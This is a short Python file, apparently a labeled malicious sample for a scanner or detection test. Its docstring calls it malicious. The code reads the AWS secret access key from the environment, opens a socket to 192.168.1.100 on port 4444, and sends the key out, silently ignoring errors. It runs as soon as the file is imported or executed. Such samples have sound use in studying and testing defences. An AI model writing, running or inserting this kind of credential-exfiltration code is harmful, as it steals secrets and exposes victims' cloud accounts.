"""Malicious: Steals AWS access keys and exfiltrates via socket."""
import os
import socket

def harvest_and_exfiltrate():
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("192.168.1.100", 4444))
        sock.send(f"STOLEN_AWS_KEY: {aws_key}".encode())
        sock.close()
    except Exception:
        pass

harvest_and_exfiltrate()
